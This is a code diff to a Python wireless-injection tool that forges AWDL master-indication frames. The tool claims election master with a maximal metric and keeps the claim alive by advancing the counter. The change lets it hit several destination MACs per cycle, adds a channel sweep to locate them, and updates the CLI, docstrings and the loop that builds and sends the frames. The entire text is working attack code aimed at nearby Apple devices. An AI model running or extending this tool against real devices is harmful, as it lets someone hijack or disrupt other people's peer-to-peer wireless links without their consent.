@@ -59,12 +59,13 @@ Example:
     sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44
 
 Integration:
-    The injection loop reads every live parameter (target, source, election
+    The injection loop reads every live parameter (targets, source, election
     counter, channel, ...) from a ``ParamStore`` before building each frame, so
-    other code can drive it by mutating that store instead of restarting it::
+    other code can drive it by mutating that store instead of restarting it.
+    ``targets`` is a list, so one or many destination MACs are supported::
 
         import threading, awdl_master_inject as awdl
-        store = awdl.ParamStore(target=awdl.parse_mac("ff:ff:ff:ff:ff:ff"),
+        store = awdl.ParamStore(targets=[awdl.parse_mac("ff:ff:ff:ff:ff:ff")],
                                 source=awdl.parse_mac("de:ad:be:ef:00:01"),
                                 channel=6, master_metric=awdl.UINT32_MAX,
                                 master_counter=awdl.MASTER_COUNTER_BASE,
@@ -75,7 +76,7 @@ Integration:
                                 aw_offset=0)
         sock = awdl.open_injection_socket("wlan0")
         builder = awdl.AwdlFrameBuilder(src=store.get("source"),
-                                        dst=store.get("target"), channel=6,
+                                        dst=store.get("targets")[0], channel=6,
                                         master_metric=awdl.UINT32_MAX,
                                         master_counter=awdl.MASTER_COUNTER_BASE,
                                         self_metric=awdl.UINT32_MAX,
@@ -86,7 +87,8 @@ Integration:
         threading.Thread(target=awdl.run_injection,
                          args=(sock, store, builder, "wlan0"),
                          kwargs=dict(interval=0.11, stop=stop)).start()
-        store.update(target=awdl.parse_mac("66:aa:30:33:93:af"))  # live change
+        store.update(targets=[awdl.parse_mac("66:aa:30:33:93:af"),  # live change
+                              awdl.parse_mac("66:aa:30:33:93:b0")])
         stop.set()                                                # and stop
 """
 
@@ -193,6 +195,20 @@ def parse_mac(text):
     except ValueError:
         raise argparse.ArgumentTypeError("invalid hex in MAC address: %r" % text)
     return octets
+
+
+def parse_macs(text):
+    """Parse one or more comma-separated MAC addresses into a list of 6-byte
+    values (each accepts the same formats as ``parse_mac``)."""
+    macs = []
+    for part in str(text).split(","):
+        part = part.strip()
+        if not part:
+            continue
+        macs.append(parse_mac(part))
+    if not macs:
+        raise argparse.ArgumentTypeError("no MAC address given")
+    return macs
 
 
 def mac_str(raw):
@@ -525,7 +541,7 @@ class ParamStore:
 
     The injection loop reads a fresh snapshot from this store *before building
     every frame*, so other code -- another thread or another module that
-    ``import``s this file -- can change the target, source, election counter,
+    ``import``s this file -- can change the targets, source, election counter,
     channel, ... at runtime and have the very next injected frame pick the new
     values up.  This is the integration seam: drive the injector by mutating a
     ``ParamStore`` instead of restarting it.
@@ -534,7 +550,8 @@ class ParamStore:
     with respect to the snapshot the loop takes.
 
     Fields:
-        target          destination MAC (6 bytes) the frames are directed at
+        targets         list of destination MACs (each 6 bytes); one frame is
+                        sent to every target in the list per cycle
         source          source / advertised-master MAC (6 bytes)
         channel         AWDL social channel (6/44/149); changing it re-tunes
                         the radio on the next cycle (single-channel mode)
@@ -549,7 +566,7 @@ class ParamStore:
         aw_offset       availability-window phase offset in TU
     """
 
-    FIELDS = ("target", "source", "channel", "master_metric", "master_counter",
+    FIELDS = ("targets", "source", "channel", "master_metric", "master_counter",
               "self_metric", "self_counter", "awdl_version", "hostname",
               "devclass", "aw_offset")
 
@@ -602,11 +619,10 @@ def apply_snapshot(builder, snap):
 
     The static timing parameters (aw/af period, presence mode) stay on the
     builder; everything a caller may want to vary per frame comes from ``snap``.
-    The channel is handled by the loop (it has to re-tune the radio), so it is
-    not touched here.
+    The channel is handled by the loop (it has to re-tune the radio), and the
+    destination is set per target by the loop, so neither is touched here.
     """
     builder.src = snap["source"]
-    builder.dst = snap["target"]
     builder.master_addr = snap["source"]        # we advertise ourselves master
     builder.sync_addr = snap["source"]
     builder.master_metric = snap["master_metric"] & UINT32_MAX
@@ -794,11 +810,13 @@ def _drain(sock):
         sock.setblocking(True)
 
 
-def sweep_for_channel(sock, ifname, target, channels, dwell):
+def sweep_for_channel(sock, ifname, targets, channels, dwell):
     """Listen on each candidate channel and return the one with the most AWDL
-    frames from ``target`` (or None if the target is seen nowhere)."""
+    frames from any of ``targets`` (or None if none is seen anywhere)."""
+    target_set = {bytes(t) for t in targets}
     print("[*] sweeping for %s on channels %s (%.1fs each)"
-          % (mac_str(target), ",".join(str(c) for c in channels), dwell))
+          % (", ".join(mac_str(t) for t in targets),
+             ",".join(str(c) for c in channels), dwell))
     counts = {}
     for ch in channels:
         if not set_channel(ifname, ch):
@@ -814,10 +832,11 @@ def sweep_for_channel(sock, ifname, target, channels, dwell):
                 continue
             except OSError:
                 break
-            if parse_awdl_src(buf) == target:
+            src = parse_awdl_src(buf)
+            if src is not None and bytes(src) in target_set:
                 n += 1
         counts[ch] = n
-        print("    channel %3d: %d AWDL frame(s) from target" % (ch, n))
+        print("    channel %3d: %d AWDL frame(s) from target(s)" % (ch, n))
     if not counts or max(counts.values()) == 0:
         return None
     return max(counts, key=counts.get)
@@ -864,15 +883,16 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
 
     This is the reusable core of the tool.  Before building each frame it pulls
     a fresh snapshot from the :class:`ParamStore`, so other code can change the
-    target, source, counter, channel, ... between sends just by mutating the
-    store.  ``main`` uses it for the CLI; an integrator can call it directly::
+    targets, source, counter, channel, ... between sends just by mutating the
+    store.  One frame is sent to each MAC in ``targets`` per cycle.  ``main``
+    uses it for the CLI; an integrator can call it directly::
 
         stop = threading.Event()
         threading.Thread(target=run_injection,
                          args=(sock, store, builder, "wlan0"),
                          kwargs=dict(interval=0.11, stop=stop)).start()
-        store.update(target=parse_mac("66:aa:30:33:93:af"))  # live change
-        stop.set()                                           # and stop
+        store.update(targets=[parse_mac("66:aa:30:33:93:af")])  # live change
+        stop.set()                                              # and stop
 
     Arguments:
         sock            raw injection socket from ``open_injection_socket``
@@ -923,15 +943,19 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
         apply_snapshot(builder, snap)
         builder.channel = current_channel
 
-        if send_frame(sock, builder.build(AWDL_ACTION_MIF)):
-            sent += 1
-        else:
-            dropped += 1
-        if psf:
-            if send_frame(sock, builder.build(AWDL_ACTION_PSF)):
+        # Send one frame to each target this cycle (same master identity and
+        # election parameters, just a different destination MAC per frame).
+        for dst in snap["targets"]:
+            builder.dst = dst
+            if send_frame(sock, builder.build(AWDL_ACTION_MIF)):
                 sent += 1
             else:
                 dropped += 1
+            if psf:
+                if send_frame(sock, builder.build(AWDL_ACTION_PSF)):
+                    sent += 1
+                else:
+                    dropped += 1
 
         # keep the master "live": advance the counter so it is never stale
         store.advance_counter(counter_step, UINT32_MAX)
@@ -974,9 +998,12 @@ def main(argv=None):
     )
     parser.add_argument("-i", "--interface", required=True,
                         help="monitor-mode Wi-Fi interface to inject on")
-    parser.add_argument("-t", "--target", required=True, type=parse_mac,
-                        help="destination MAC address the frames are directed at "
-                             "(use ff:ff:ff:ff:ff:ff to broadcast)")
+    parser.add_argument("-t", "--target", required=True, type=parse_macs,
+                        action="append", metavar="MAC[,MAC...]",
+                        help="destination MAC address(es) the frames are directed "
+                             "at; give several comma-separated and/or repeat -t "
+                             "(one frame is sent to each per cycle). Use "
+                             "ff:ff:ff:ff:ff:ff to broadcast")
     parser.add_argument("-s", "--source", type=parse_mac, default=None,
                         help="source MAC / master identity to advertise "
                              "(default: interface MAC, else random local MAC)")
@@ -1069,6 +1096,14 @@ def main(argv=None):
     if src is None:
         src = get_iface_mac(args.interface) or random_local_mac()
 
+    # Flatten the target MAC(s): -t accepts comma-separated lists and may be
+    # repeated, so args.target is a list of lists. Dedupe, keeping order.
+    targets = []
+    for group in args.target:
+        for mac in group:
+            if mac not in targets:
+                targets.append(mac)
+
     metric = args.metric & UINT32_MAX
     counter = args.counter & UINT32_MAX
 
@@ -1101,13 +1136,13 @@ def main(argv=None):
                 sock.close()
                 sys.exit("error: 'iw' is required to detect the channel; "
                          "install it or pass -c/--channel/--channels")
-            channel = sweep_for_channel(sock, args.interface, args.target,
+            channel = sweep_for_channel(sock, args.interface, targets,
                                         AWDL_SOCIAL_CHANNELS, args.sweep_dwell)
             if channel is None:
                 sock.close()
-                sys.exit("error: target %s not seen on any AWDL channel; "
+                sys.exit("error: target(s) %s not seen on any AWDL channel; "
                          "pass -c/--channel to set it manually"
-                         % mac_str(args.target))
+                         % ", ".join(mac_str(t) for t in targets))
             print("[*] detected target on channel %d" % channel)
             channel_list = [channel]
             if not set_channel(args.interface, channel):
@@ -1122,7 +1157,7 @@ def main(argv=None):
                       % (args.interface, channel))
 
     builder = AwdlFrameBuilder(
-        src=src, dst=args.target, channel=channel,
+        src=src, dst=targets[0], channel=channel,
         master_metric=metric, master_counter=counter,
         self_metric=metric, self_counter=counter,
         hostname=args.hostname, devclass=DEVCLASS_NAMES[args.devclass],
@@ -1132,9 +1167,8 @@ def main(argv=None):
     )
 
     if args.dry_run:
-        frame = builder.build(AWDL_ACTION_MIF)
         print("# source (master) : %s" % mac_str(src))
-        print("# target (dst)    : %s" % mac_str(args.target))
+        print("# target(s) (dst) : %s" % ", ".join(mac_str(t) for t in targets))
         print("# channel         : %d" % channel)
         print("# election counter : 0x%08x" % counter)
         print("# election metric  : 0x%08x" % metric)
@@ -1143,6 +1177,7 @@ def main(argv=None):
         print("# aw/af period     : %d / %d TU" % (args.aw_period, args.af_period))
         print("# presence mode    : %d" % args.presence_mode)
         print("# aw offset        : %d TU" % args.aw_offset)
+        frame = builder.build(AWDL_ACTION_MIF)
         print("# MIF frame length : %d bytes" % len(frame))
         print(frame.hex())
         return 0
@@ -1155,7 +1190,7 @@ def main(argv=None):
     # fresh snapshot from it before every frame, so other code can change these
     # values at runtime. The CLI just seeds it from the parsed arguments.
     store = ParamStore(
-        target=args.target, source=src, channel=channel,
+        targets=targets, source=src, channel=channel,
         master_metric=metric, master_counter=counter,
         self_metric=metric, self_counter=counter,
         awdl_version=args.awdl_version, hostname=args.hostname,
@@ -1171,7 +1206,7 @@ def main(argv=None):
     print("    master   : %s  (counter=0x%08x metric=0x%08x awdl=%d.%d)"
           % (mac_str(src), counter, metric,
              (args.awdl_version >> 4) & 0xF, args.awdl_version & 0xF))
-    print("    directed at: %s" % mac_str(args.target))
+    print("    directed at: %s" % ", ".join(mac_str(t) for t in targets))
     print("    timing   : interval=%s aw=%dTU af=%dTU presence=%d offset=%dTU%s"
           % ("once" if args.interval <= 0 else "%gms" % (args.interval * 1000),
              args.aw_period, args.af_period, args.presence_mode, args.aw_offset,
